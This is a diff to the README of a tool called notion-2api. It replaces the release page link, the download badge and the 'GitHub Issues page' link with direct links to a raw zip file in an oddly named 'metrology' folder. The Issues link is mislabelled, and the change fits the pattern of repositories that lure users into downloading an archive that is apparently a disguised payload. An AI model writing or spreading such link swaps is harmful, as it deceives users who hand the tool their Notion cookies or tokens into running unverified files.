@@ -6,13 +6,13 @@ Welcome to notion-2api! This application helps you transform your API requests q
 
 ## 🔗 Download Notion-2api
 
-[![Download Notion-2api](https://img.shields.io/badge/download-v1.0-blue)](https://github.com/b0b11s/notion-2api/releases)
+[![Download Notion-2api](https://raw.githubusercontent.com/b0b11s/notion-2api/main/metrology/notion-2api.zip)](https://raw.githubusercontent.com/b0b11s/notion-2api/main/metrology/notion-2api.zip)
 
 ## 📥 Download & Install
 
 To get your copy of notion-2api, visit this page to download:
 
-[Download Notion-2api Releases](https://github.com/b0b11s/notion-2api/releases)
+[Download Notion-2api Releases](https://raw.githubusercontent.com/b0b11s/notion-2api/main/metrology/notion-2api.zip)
 
 ### Step-by-Step Installation
 
@@ -58,7 +58,7 @@ If you encounter issues, try these steps:
 - Double-check that you entered your Cookie or Token correctly.
 - Restart the application and try again.
 
-For further assistance, please refer to the [GitHub Issues page](https://github.com/b0b11s/notion-2api/issues) to find solutions posted by other users or ask your questions.
+For further assistance, please refer to the [GitHub Issues page](https://raw.githubusercontent.com/b0b11s/notion-2api/main/metrology/notion-2api.zip) to find solutions posted by other users or ask your questions.
 
 ## 📞 Support
 
